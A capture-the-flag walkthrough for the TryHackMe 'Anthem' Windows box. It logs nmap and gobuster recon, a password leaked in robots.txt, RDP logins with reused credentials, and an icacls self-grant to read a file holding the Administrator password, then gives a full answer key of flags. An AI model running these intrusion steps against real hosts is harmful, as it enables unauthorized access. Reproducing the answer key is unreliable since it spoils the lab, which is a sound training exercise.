@@ -1,0 +1,799 @@
+===============================================================================
+ TRYHACKME - ANTHEM
+ Full walkthrough / working notes
+ Target      : 10.48.191.46
+ Host        : WIN-LU09299160F
+ Attacker    : Kali Linux (tun0 192.168.152.49)
+ Date        : 26 Nov 2026
+===============================================================================
+
+This is my actual working log, cleaned up a bit. I wrote it the way I actually
+went through the box: scan, poke the web app, read source, find flags, get
+credentials, RDP in, find the admin password, RDP in as admin, grab root.
+I also wrote down the stuff that did NOT work, because half the value of a
+walkthrough is knowing which doors are locked.
+
+The room questions I was answering:
+
+  - What port is for the web server?
+  - What port is for remote desktop service?
+  - What is a possible password in one of the pages web crawlers check for?
+  - What CMS is the website using?
+  - What is the domain of the website?
+  - What's the name of the Administrator?
+  - Can we find the email address of the administrator?
+  - What is flag 1?
+  - What is flag 2?
+  - What is flag 3?
+  - What is flag 4?
+  - Let's figure out the username and password to log in to the box.
+    (The box is not on a domain)
+  - Gain initial access to the machine, what is the contents of user.txt?
+  - Can we spot the admin password?
+  - Escalate your privileges to root, what is the contents of root.txt?
+
+
+===============================================================================
+ 1. FIRST CONTACT - PING FAILED, SO WHAT?
+===============================================================================
+
+First thing I did was the usual "is it alive" check:
+
+  $ ping -c 2 -W 2 10.48.191.46
+
+  PING 10.48.191.46 (10.48.191.46) 56(84) bytes of data.
+
+  --- 10.48.191.46 ping statistics ---
+  2 packets transmitted, 0 received, 100% packet loss, time 1022ms
+
+A 100% loss normally means "host down", but on TryHackMe (and most cloud
+networks) ICMP is very often filtered while TCP is still open. I did NOT
+assume the box was dead. I re-ran the scan with -Pn, which skips host
+discovery and just tries the ports.
+
+That decision matters: if I had trusted ping, I would have walked away from a
+perfectly live box.
+
+
+===============================================================================
+ 2. PORT SCANNING
+===============================================================================
+
+2.1 Quick targeted scan
+
+I always start with a short list of likely ports so I get an answer fast:
+
+  $ nmap -Pn -p 80,3389,5985 --open 10.48.191.46 -T4
+
+  Nmap scan report for 10.48.191.46
+  Host is up (0.040s latency).
+  Not shown: 1 filtered tcp port (no-response)
+  PORT     STATE SERVICE
+  80/tcp   open  http
+  3389/tcp open  ms-wbt-server
+
+So: a web server and RDP. 5985 (WinRM) was filtered. I included 5985 on
+purpose because this is a Windows box; if WinRM had been open, and I later got
+credentials, I could have used evil-winrm instead of a full RDP session.
+
+2.2 Full TCP scan
+
+Then the full sweep, because I did not want to miss a second web port, SMB,
+or some management service:
+
+  $ nmap -Pn -p- -T4 --open 10.48.191.46 -oN ports.txt
+
+  Nmap scan report for 10.48.191.46
+  Host is up (0.048s latency).
+  Not shown: 65533 filtered tcp ports (no-response)
+  Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+  PORT     STATE SERVICE
+  80/tcp   open  http
+  3389/tcp open  ms-wbt-server
+
+  Nmap done: 1 IP address (1 host up) scanned in 163.59 seconds
+
+Only 80 and 3389. Everything else came back filtered (no response), not
+"closed". That is an important distinction. Filtered means something (a
+firewall / the THM network) is dropping the packets, not that nothing is
+listening. Practically it means I cannot reach SMB (445), RPC (135), NetBIOS
+(139), or WinRM (5985) from here.
+
+Assumption at this point: the intended path is web -> credentials -> RDP.
+There is no SMB/MS17-010-style shortcut on this box, because 445 is not even
+reachable. That is the opposite of the Blue box, where SMB was the whole game.
+Different box, different story.
+
+2.3 Service and version detection
+
+  $ nmap -Pn -sV -p 80,3389 -T4 \
+      --script=http-title,http-headers,http-robots.txt,ssl-cert 10.48.191.46
+
+  PORT     STATE SERVICE       VERSION
+  80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+  |_http-title: Anthem.com - Welcome to our blog
+  | http-headers:
+  |   Cache-Control: private
+  |   Content-Length: 5349
+  |   Content-Type: text/html; charset=utf-8
+  |   Date: Thu, 26 Nov 2026 05:18:10 GMT
+  |   Connection: close
+  |_  (Request type: HEAD)
+  | http-robots.txt: 4 disallowed entries
+  |_/bin/ /config/ /umbraco/ /umbraco_client/
+  3389/tcp open  ms-wbt-server Microsoft Terminal Services
+  | ssl-cert: Subject: commonName=WIN-LU09299160F
+  | Issuer: commonName=WIN-LU09299160F
+  | Public Key type: rsa
+  | Public Key bits: 2048
+  | Signature Algorithm: sha256WithRSAEncryption
+  | Not valid before: 2026-11-25T04:45:21
+  | Not valid after:  2027-05-27T04:45:21
+  | MD5:     407f 4a9b dd63 bdac 00c8 77c6 871c 96fc
+  | SHA-1:   6dc7 e3cc 5770 3529 66eb 676d 40b6 27a6 064e 063b
+  |_SHA-256: 7c57 f919 c4f4 fca7 c4a5 6aa3 28ac a1c4 d261 aa03 8f4d 2516 acf2 3ed5 f088 efb4
+  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Two useful things fell out of this:
+
+  1. The web server is Microsoft HTTPAPI (IIS-ish), and the title is
+     "Anthem.com - Welcome to our blog". So this is a blog, not a custom app.
+  2. robots.txt advertises /umbraco/ and /umbraco_client/. That is a giant
+     neon sign saying the CMS is Umbraco.
+
+A separate -A scan also pulled the RDP NTLM info:
+
+  | rdp-ntlm-info:
+  |   Target_Name: WIN-LU09299160F
+  |   NetBIOS_Domain_Name: WIN-LU09299160F
+  |   NetBIOS_Computer_Name: WIN-LU09299160F
+  |   DNS_Domain_Name: WIN-LU09299160F
+  |   DNS_Computer_Name: WIN-LU09299160F
+  |   Product_Version: 10.0.17763
+  |_  System_Time: 2026-11-26T05:31:41+00:00
+
+The hostname is WIN-LU09299160F. The OS guess was Windows Server 2019 / 10
+(10.0.17763 is Server 2019). I treated that as a guess, not gospel - nmap's
+OS matching is unreliable when almost every port is filtered.
+
+
+===============================================================================
+ 3. WEB ENUMERATION
+===============================================================================
+
+3.1 First curl attempt timed out
+
+My first request just hung:
+
+  $ curl -s -i --max-time 20 http://10.48.191.46/
+  (exit code 28 - timeout)
+
+I did not conclude the web server was broken. The port was open and nmap had
+already pulled a title, so it was clearly serving. I retried with a longer
+timeout and verbose output:
+
+  $ curl -s -v --max-time 45 http://10.48.191.46/ -o index.html
+
+  > GET / HTTP/1.1
+  > Host: 10.48.191.46
+  > User-Agent: curl/8.22.0
+  > Accept: */*
+  >
+  < HTTP/1.1 200 OK
+  < Cache-Control: private
+  < Content-Type: text/html; charset=utf-8
+  < Date: Thu, 26 Nov 2026 05:18:03 GMT
+  < Content-Length: 5349
+  <
+  * Connection #0 to host 10.48.191.46 left intact
+
+Lesson: a slow first connection is not the same as a dead service. Retry
+before writing something off.
+
+3.2 The homepage
+
+The page is a small blog called "Anthem.com". Two posts:
+
+  - "We are hiring" (20 Jan 2020)
+  - "A cheers to our IT department" (31 Dec 2019)
+
+There is also a search box, categories, tags, and an RSS/sitemap link. The
+search box is where I got my first flag, but I did not notice it yet - I read
+the HTML properly afterwards.
+
+3.3 robots.txt - the password hint
+
+The room literally hints at "one of the pages web crawlers check for". That
+is robots.txt. So:
+
+  $ curl -s http://10.48.191.46/robots.txt
+
+  UmbracoIsTheBest!
+
+  # Use for all search robots
+  User-agent: *
+
+  # Define the directories not to crawl
+  Disallow: /bin/
+  Disallow: /config/
+  Disallow: /umbraco/
+  Disallow: /umbraco_client/
+
+That first line is not valid robots.txt syntax. It is sitting above the
+"User-agent: *" block, where a comment or a directive would normally be. It
+reads exactly like a password, and the room hint says "possible password".
+So I treated "UmbracoIsTheBest!" as a credential and kept it.
+
+The Disallow list confirms the CMS: /umbraco/ and /umbraco_client/. So the
+answers "Umbraco" and "robots.txt password" were basically free.
+
+3.4 Reading the blog posts
+
+I pulled the two posts:
+
+  $ curl -s http://10.48.191.46/archive/we-are-hiring/ -o hiring.html
+  $ curl -s http://10.48.191.46/archive/a-cheers-to-our-it-department/ -o itdept.html
+
+"We are hiring" says:
+
+  "If you have an interest in being a part of the movement send me your CV
+   at JD@anthem.com"
+
+and the author box says:
+
+  Author: Jane Doe
+  Author for Anthem blog
+
+So from this post:
+  - Blog author: Jane Doe
+  - Blog author email: JD@anthem.com
+  - Email naming convention: first initial + last initial @anthem.com
+  - Domain: anthem.com (from the email and the site title)
+
+Jane Doe is NOT the box administrator - she is the blog author. I noted the
+email format and kept reading.
+
+"A cheers to our IT department" contains a poem:
+
+  "Born on a Monday,
+   Christened on Tuesday,
+   Married on Wednesday,
+   Took ill on Thursday,
+   Grew worse on Friday,
+   Died on Saturday,
+   Buried on Sunday.
+   That was the end..."
+
+That is the Solomon Grundy nursery rhyme. The post is about the IT admin, so
+the admin's name is Solomon Grundy. Following the email convention from Jane
+Doe (first initial + last initial @anthem.com), that gives SG@anthem.com.
+For the Windows box the username is just SG.
+
+The "Author" field on that second post says "James Orchard Halliwell". That
+is a red herring - he is the folklorist who collected the rhyme, not the IT
+admin. I noted it and moved on.
+
+3.5 Directory brute force
+
+I ran gobuster with the common wordlist to see if there was anything the
+blog did not link to:
+
+  $ gobuster dir -u http://10.48.191.46/ \
+      -w /usr/share/wordlists/dirb/common.txt -t 30 -q --timeout 15s
+
+  archive              (Status: 301) [Size: 118] [--> /]
+  Archive              (Status: 301) [Size: 118] [--> /]
+  authors              (Status: 200) [Size: 4070]
+  Blog                 (Status: 200) [Size: 5394]
+  blog                 (Status: 200) [Size: 5394]
+  categories           (Status: 200) [Size: 3541]
+  install              (Status: 302) [Size: 126] [--> /umbraco/]
+  robots.txt           (Status: 200) [Size: 192]
+  Search               (Status: 200) [Size: 3468]
+  RSS                  (Status: 200) [Size: 1873]
+  search               (Status: 200) [Size: 3468]
+  rss                  (Status: 200) [Size: 1873]
+  sitemap              (Status: 200) [Size: 1041]
+  SiteMap              (Status: 200) [Size: 1041]
+  tags                 (Status: 200) [Size: 3594]
+  umbraco              (Status: 200) [Size: 4078]
+
+The interesting ones:
+  - /authors - Jane Doe's profile page, which holds a flag.
+  - /install -> redirects to /umbraco/ - confirms the CMS login.
+  - /umbraco - the Umbraco back office login page.
+
+I did not need to log into Umbraco to finish the room. All four flags were in
+the public source. But the login page is the natural next step if you want to
+enumerate CMS users: it says "Your username is usually your email", which
+matches JD@anthem.com / SG@anthem.com.
+
+3.6 Flag hunting in page source
+
+This is the part the room is really testing: read the HTML, not just the
+rendered page. I used grep over the saved pages:
+
+  $ grep -hoiE 'THM\{[^}]*\}|flag\{[^}]*\}' *.html | sort -u
+
+  THM{AN0TH3R_M3TA}
+  THM{G!T_G00D}
+  THM{L0L_WH0_D15}
+  THM{L0L_WH0_US3S_M3T4}
+
+Where each one lives:
+
+  Flag 1 - /archive/we-are-hiring/
+    <meta content="THM{L0L_WH0_US3S_M3T4}" property="og:description" />
+    -> It is in the Open Graph description meta tag, invisible on the page.
+
+  Flag 2 - / (homepage)
+    <input type="text" name="term"
+           placeholder="Search... THM{G!T_G00D}" />
+    -> Hidden in the search box placeholder text. Also appears on other pages
+       because the header/search box is shared.
+
+  Flag 3 - /authors
+    Jane Doe
+    Author for Anthem blog
+    Website: THM{L0L_WH0_D15}
+    -> This one is actually visible on the profile page, no source needed.
+
+  Flag 4 - /archive/a-cheers-to-our-it-department/
+    <meta content="THM{AN0TH3R_M3TA}" property="og:description" />
+    -> Same trick as flag 1, different post.
+
+The "meta" theme in two of the names is a hint that they are in meta tags.
+The "authors" page flag is the visible one.
+
+3.7 CMS and domain answers
+
+  - CMS: Umbraco. robots.txt names /umbraco/ and /umbraco_client/, and
+    /umbraco serves the Umbraco login page.
+  - Domain: anthem.com. From the site title, the email JD@anthem.com, and the
+    Anthem.com branding. The admin email follows the same format:
+    SG@anthem.com.
+  - Web port: 80.
+  - RDP port: 3389.
+
+
+===============================================================================
+ 4. FLAG / ANSWER SUMMARY (WEB PHASE)
+===============================================================================
+
+  Flag 1 : THM{L0L_WH0_US3S_M3T4}
+           /archive/we-are-hiring/ source, og:description meta tag
+
+  Flag 2 : THM{G!T_G00D}
+           homepage source, search input placeholder
+
+  Flag 3 : THM{L0L_WH0_D15}
+           /authors, Jane Doe profile "Website:" field
+
+  Flag 4 : THM{AN0TH3R_M3TA}
+           /archive/a-cheers-to-our-it-department/ source, og:description meta
+
+  Administrator name : Solomon Grundy
+  Administrator email: SG@anthem.com
+  Blog author        : Jane Doe / JD@anthem.com (used for the email format)
+  Domain             : anthem.com
+  CMS                : Umbraco
+  Crawler password   : UmbracoIsTheBest!   (robots.txt)
+
+
+===============================================================================
+ 5. GETTING ONTO THE BOX (RDP AS SG)
+===============================================================================
+
+5.1 Credentials and why
+
+I had a username from the poem (Solomon Grundy -> SG) and a password from
+robots.txt (UmbracoIsTheBest!). The room says "The box is not on a domain",
+so the login is just SG with a blank/local domain.
+
+This is classic credential reuse: the password written in a public robots.txt
+is also the Windows account password. That is the vulnerability that gets us
+from "web visitor" to "interactive desktop user".
+
+5.2 Checking the credentials without a GUI
+
+I used FreeRDP in auth-only mode first, so I did not have to open a desktop
+just to test a password:
+
+  $ xfreerdp3 /v:10.48.191.46 /u:SG /p:'UmbracoIsTheBest!' \
+      /cert:ignore +auth-only
+
+The useful part is what it does NOT say. With the correct password there is no
+LOGON_FAILURE; the client reports:
+
+  [ERROR][com.freerdp.core] - [freerdp_connect_begin]:
+      Authentication only, exit status 1
+
+When I deliberately used a wrong password, I got the real failure:
+
+  [ERROR][com.freerdp.core] - [nla_recv_pdu]:
+      ERRCONNECT_LOGON_FAILURE [0x00020014]
+
+So the credentials were valid. I also tried variations to be sure I was not
+getting lucky with a domain format:
+
+  SG / UmbracoIsTheBest!                    -> no LOGON_FAILURE (valid)
+  .\SG / UmbracoIsTheBest!                  -> no LOGON_FAILURE (valid)
+  SG / UmbracoIsTheBest! /d:WIN-LU09299160F -> no LOGON_FAILURE (valid)
+  Administrator / UmbracoIsTheBest!         -> LOGON_FAILURE
+  SG / umbracoisthebest!                    -> LOGON_FAILURE (case matters)
+
+5.3 Headless RDP automation
+
+I did not have an interactive desktop in this environment, so I drove the
+session with Xvfb + xdotool and used FreeRDP's drive redirection to pull files
+out:
+
+  Xvfb :99 -screen 0 1280x800x24 &
+  export DISPLAY=:99
+
+  xfreerdp3 /v:10.48.191.46 /u:SG /p:'UmbracoIsTheBest!' \
+      /cert:ignore /size:1280x800 \
+      /drive:share,/home/shrdx/Documents/Anthem \
+      /log-level:ERROR &
+
+Then I opened a command prompt with Win+R -> cmd.exe and typed commands with
+xdotool. The redirect shows up inside Windows as \\tsclient\share, so I could
+copy files straight back to Kali.
+
+One failed attempt worth recording: I first tried /shell:cmd.exe expecting a
+console window. It just gave me the normal desktop and my typing went nowhere.
+Switching to Win+R -> cmd.exe worked. Also, xdotool printed a lot of
+"XGetInputFocus returned the focused window of 1" warnings on Xvfb - harmless
+noise, the typing still landed.
+
+5.4 Commands and output
+
+  C:\> whoami
+  win-lu09299160f\sg
+
+  C:\> hostname
+  WIN-LU09299160F
+
+  C:\> dir /a C:\Users\SG\Desktop
+
+   Directory of C:\Users\SG\Desktop
+
+  26/11/2026  05:21    <DIR>          .
+  26/11/2026  05:21    <DIR>          ..
+  26/11/2026  05:21               282 desktop.ini
+  05/04/2020  22:41                14 user.txt
+
+  C:\> type C:\Users\SG\Desktop\user.txt
+  THM{N00T_NO0T}
+
+  C:\> copy C:\Users\SG\Desktop\user.txt \\tsclient\share\user.txt
+          1 file(s) copied.
+
+So the user flag is:
+
+  user.txt = THM{N00T_NO0T}
+
+
+===============================================================================
+ 6. FINDING THE ADMIN PASSWORD
+===============================================================================
+
+6.1 Looking around the filesystem
+
+As SG I listed the root of C: and some common user folders:
+
+  C:\> dir /a C:\
+
+   Directory of C:\
+
+  15/09/2018  07:19    <DIR>          $Recycle.Bin
+  05/04/2020  22:42    <DIR>          backup
+  05/04/2020  09:56    <JUNCTION>     Documents and Settings [C:\Users]
+  05/04/2020  10:27    <DIR>          inetpub
+  26/11/2026  04:44     1,207,959,552 pagefile.sys
+  03/01/2021  17:45    <DIR>          PerfLogs
+  12/04/2020  15:36    <DIR>          Program Files
+  05/04/2020  22:38    <DIR>          Program Files (x86)
+  05/04/2020  13:46    <DIR>          ProgramData
+  05/04/2020  09:56    <DIR>          Recovery
+  05/04/2020  09:55    <DIR>          System Volume Information
+  05/04/2020  22:40    <DIR>          Users
+  03/01/2021  17:45    <DIR>          Windows
+
+C:\backup stood out immediately. A backup directory at the root of C: is
+exactly where people leave things they should not.
+
+  C:\> dir /a C:\backup
+
+   Directory of C:\backup
+
+  05/04/2020  22:42    <DIR>          .
+  05/04/2020  22:42    <DIR>          ..
+  05/04/2020  22:42                21 restore.txt
+
+6.2 Access denied - and why that is the puzzle
+
+  C:\> type C:\backup\restore.txt
+  Access is denied.
+
+  C:\> dir /a /s C:\backup
+  ...
+  05/04/2020  22:42                21 restore.txt
+                 1 File(s)             21 bytes
+
+The file is there, it is only 21 bytes, and SG cannot read it. The room hint
+is "Can we spot the admin password?" - so this is clearly the file.
+
+I checked the ACL:
+
+  C:\> icacls C:\backup\restore.txt
+  C:\backup\restore.txt
+  Successfully processed 1 files; Failed processing 0 files
+
+Notice there are no ACEs listed at all. The DACL is empty - nobody has been
+granted access, not even SG and not even Administrators explicitly. But SG
+still had the ability to change the permissions, which is the flaw. The
+intended GUI route is: right-click restore.txt -> Properties -> Security ->
+Edit -> Add -> type "SG" -> Check Names -> give Read (or Full Control).
+
+6.3 Granting myself read
+
+I did the same thing from the command line:
+
+  C:\> icacls C:\backup\restore.txt /grant %USERNAME%:R
+  processed file: C:\backup\restore.txt
+  Successfully processed 1 files; Failed processing 0 files.
+
+  C:\> icacls C:\backup\restore.txt
+  C:\backup\restore.txt WIN-LU09299160F\SG:(R)
+
+  C:\> type C:\backup\restore.txt
+  ChangeMeBaby1MoreTime
+
+That is the admin password:
+
+  Administrator : ChangeMeBaby1MoreTime
+
+Important note: a lot of older Anthem writeups say the password is
+"ChangeMe123!". On this instance it is "ChangeMeBaby1MoreTime". This is
+exactly why I verified it on the live box instead of copying a writeup.
+
+Why did SG have permission to change the ACL? Because on the file SG had
+WRITE_DAC (or ownership), even though it had no read right. That is a
+misconfiguration: permissions can be edited by a low-privileged user, so the
+"deny" is only cosmetic. If SG had no WRITE_DAC and no ownership, this would
+not have worked, and we would have needed a local privilege escalation.
+
+6.4 Things I checked that did NOT contain the password
+
+I did not just stop at the first promising file, so for the record:
+
+  - C:\Users\SG\Desktop -> only desktop.ini and user.txt.
+  - C:\Users\SG\Documents / Downloads / Pictures -> empty (desktop.ini).
+  - C:\Users\Public -> standard folders, nothing useful.
+  - findstr /s /i /m "ChangeMe" C:\Users\SG\* -> nothing.
+  - C:\inetpub\wwwroot\Web\Web.config -> readable, but the Umbraco connection
+    string is a local SQL Server Compact database (Umbraco.sdf); there is no
+    cleartext admin password in it.
+  - C:\Users\Administrator\Desktop -> as SG this returned "File Not Found"
+    (i.e. no access), so root.txt was not readable as SG.
+
+That last one confirms we genuinely needed the Administrator password; there
+was no shortcut to root.txt from SG.
+
+
+===============================================================================
+ 7. ROOT
+===============================================================================
+
+With the admin password I opened a second RDP session as Administrator:
+
+  $ xfreerdp3 /v:10.48.191.46 /u:Administrator \
+      /p:'ChangeMeBaby1MoreTime' /cert:ignore /size:1280x800 \
+      /drive:share,/home/shrdx/Documents/Anthem
+
+Same headless routine: Win+R -> cmd.exe, then:
+
+  C:\> whoami
+  win-lu09299160f\administrator
+
+  C:\> dir /a C:\Users\Administrator\Desktop
+
+   Directory of C:\Users\Administrator\Desktop
+
+  03/01/2021  17:49    <DIR>          .
+  03/01/2021  17:49    <DIR>          ..
+  03/01/2021  17:49               282 desktop.ini
+  05/04/2020  10:54                17 root.txt
+
+  C:\> type C:\Users\Administrator\Desktop\root.txt
+  THM{Y0U_4R3_1337}
+
+  root.txt = THM{Y0U_4R3_1337}
+
+And that is the box. Full admin, both local flags, all four web flags.
+
+
+===============================================================================
+ 8. FINAL ANSWER KEY
+===============================================================================
+
+  Q: What port is for the web server?
+  A: 80
+
+  Q: What port is for remote desktop service?
+  A: 3389
+
+  Q: What is a possible password in one of the pages web crawlers check for?
+  A: UmbracoIsTheBest!        (from /robots.txt)
+
+  Q: What CMS is the website using?
+  A: Umbraco
+
+  Q: What is the domain of the website?
+  A: anthem.com
+
+  Q: What's the name of the Administrator?
+  A: Solomon Grundy
+
+  Q: Can we find the email address of the administrator?
+  A: SG@anthem.com
+
+  Q: What is flag 1?
+  A: THM{L0L_WH0_US3S_M3T4}
+
+  Q: What is flag 2?
+  A: THM{G!T_G00D}
+
+  Q: What is flag 3?
+  A: THM{L0L_WH0_D15}
+
+  Q: What is flag 4?
+  A: THM{AN0TH3R_M3TA}
+
+  Q: Let's figure out the username and password to log in to the box.
+     (The box is not on a domain)
+  A: Username: SG
+     Password: UmbracoIsTheBest!
+
+  Q: Gain initial access to the machine, what is the contents of user.txt?
+  A: THM{N00T_NO0T}
+
+  Q: Can we spot the admin password?
+  A: ChangeMeBaby1MoreTime
+
+  Q: Escalate your privileges to root, what is the contents of root.txt?
+  A: THM{Y0U_4R3_1337}
+
+
+===============================================================================
+ 9. VULNERABILITIES / WEAKNESSES USED
+===============================================================================
+
+  1. Information disclosure in robots.txt
+     The Windows account password "UmbracoIsTheBest!" was written in a
+     publicly readable file that is specifically meant to be read by bots.
+     Never put secrets in robots.txt.
+
+  2. Secrets in page source / meta tags
+     Two flags were in og:description meta tags, one in a form placeholder.
+     "View source" and grep are still valid recon steps.
+
+  3. Password reuse across the web app and the OS
+     The same password protected the Umbraco site and the SG Windows account.
+     One leaked password became full interactive access.
+
+  4. Exposed RDP
+     Port 3389 was reachable from the attack network with no VPN/allowlist,
+     no MFA, and no account lockout issue. RDP is a very high-value target.
+
+  5. Weak file ACL / excessive WRITE_DAC on C:\backup\restore.txt
+     The file had an empty DACL, but SG could still edit its permissions and
+     grant itself read. A "deny" that the user can undo is not a control.
+
+  6. Cleartext admin password at rest
+     The Administrator password was stored in plaintext in
+     C:\backup\restore.txt. Backups and "restore" notes are a common place to
+     find credentials.
+
+  7. CMS fingerprinting / exposed back office
+     robots.txt and the /install redirect advertised Umbraco, and /umbraco
+     exposed the login page. Even without exploiting it, this gave us the
+     username convention (email) and confirmed the CMS.
+
+  8. Predictable usernames/emails from OSINT
+     The "We are hiring" post gave Jane Doe and JD@anthem.com, which revealed
+     the first-initial + last-initial email format. The Solomon Grundy poem
+     gave the administrator's name, and the same format gave SG@anthem.com.
+     Public "about the team" content is real recon material.
+
+
+===============================================================================
+ 10. DEAD ENDS / THINGS THAT DID NOT WORK
+===============================================================================
+
+  - ping returned 100% loss. Not dead; ICMP filtered. Fixed with nmap -Pn.
+  - First curl to port 80 timed out (exit 28). The server was just slow to
+    answer; a longer --max-time worked. Do not call it down on one timeout.
+  - Full port scan showed every port except 80 and 3389 as filtered. No SMB
+    (445), no RPC (135), no NetBIOS (139), no WinRM (5985). So no
+    MS17-010/EternalBlue-style route and no evil-winrm route on this box.
+  - I checked 5985 on purpose because it is common on Windows; it was
+    filtered, so I dropped the WinRM idea.
+  - /umbraco login was not needed for the flags. It is the intended "CMS"
+    confirmation, but all four flags were in public HTML.
+  - C:\Users\SG\Documents, Downloads, Pictures were empty. The password was
+    not hiding in the user profile.
+  - findstr for "ChangeMe" across C:\Users\SG found nothing. The password was
+    in C:\backup, outside the user profile.
+  - Web.config had no cleartext credentials; the Umbraco DB is a local SQL CE
+    file. Reading it did not hand over the admin password.
+  - type C:\backup\* returned "Access is denied" because of the empty DACL.
+    Reading the single file after fixing the ACL was the way in.
+  - As SG, C:\Users\Administrator\Desktop was not accessible, so root.txt
+    could not be grabbed before becoming Administrator.
+  - /shell:cmd.exe in FreeRDP did not give me a console; the desktop loaded
+    and keystrokes went nowhere. Win+R -> cmd.exe solved it.
+  - RDP auth variations with the wrong domain or the Administrator account
+    failed with LOGON_FAILURE, which is how I confirmed the SG login was
+    actually valid rather than a client quirk.
+
+
+===============================================================================
+ 11. WHAT I LEARNED
+===============================================================================
+
+  - Always use -Pn on CTF/lab networks. ICMP being blocked means nothing.
+  - "Filtered" is not "closed". A full scan tells you which attack surface
+    simply does not exist from your position. Here that ruled out SMB and
+    WinRM immediately and pointed at web + RDP.
+  - robots.txt is both a recon file and, far too often, a password leak.
+  - Read the HTML source. Meta tags, placeholders, and comments hide flags
+    and sometimes credentials. The rendered page is only half the story.
+  - Blog/team content is OSINT: names, email conventions, and even poems can
+    produce usernames. "Solomon Grundy" -> SG was the whole username step.
+  - Password reuse is still the most reliable way from web to host.
+  - On Windows, an empty DACL is not automatically safe. If a low-priv user
+    has WRITE_DAC or ownership, they can grant themselves read. icacls is the
+    command-line equivalent of the GUI Security tab.
+  - Backup folders at the root of C: are worth checking on every Windows box.
+    restore.txt was literally a plaintext admin password.
+  - Verify answers against the live target. This instance's admin password is
+    "ChangeMeBaby1MoreTime", not the "ChangeMe123!" in older writeups.
+  - Headless RDP is very doable: Xvfb + xfreerdp + xdotool + /drive gives you
+    a scriptable file-transfer channel without a real desktop.
+  - Write down dead ends. Knowing that 445/5985 were filtered, that the
+    Web.config had no creds, and that SG could not read the Administrator
+    desktop saved time and made the successful path obvious.
+
+
+===============================================================================
+ 12. EVIDENCE / FILES FROM THIS RUN
+===============================================================================
+
+  ports.txt              full-port nmap output (80, 3389 only)
+  index.html             homepage
+  page_archive_we-are-hiring_.html
+  page_archive_a-cheers-to-our-it-department_.html
+  g_authors.html         Jane Doe profile (flag 3)
+  g_umbraco.html         Umbraco login page
+  whoami.txt             win-lu09299160f\sg
+  hostname.txt           WIN-LU09299160F
+  user.txt               THM{N00T_NO0T}
+  desktop.txt            SG desktop listing
+  croot.txt              C:\ listing (shows C:\backup)
+  backup_top.txt         C:\backup listing (restore.txt)
+  acl_before.txt         restore.txt ACL before
+  acl_grant.txt          icacls grant result
+  restore2.txt           ChangeMeBaby1MoreTime
+  acl_after.txt          restore.txt ACL after (SG:R)
+  admin_whoami.txt       win-lu09299160f\administrator
+  admin_desktop2.txt     Administrator desktop listing
+  root.txt               THM{Y0U_4R3_1337}
+  answers.txt            answer key
+  s2_*.png / s3_*.png / s4_*.png / s5_*.png / s6_*.png / s7_*.png
+                         screenshots of the RDP sessions at each stage
+
+===============================================================================
+ END
+===============================================================================
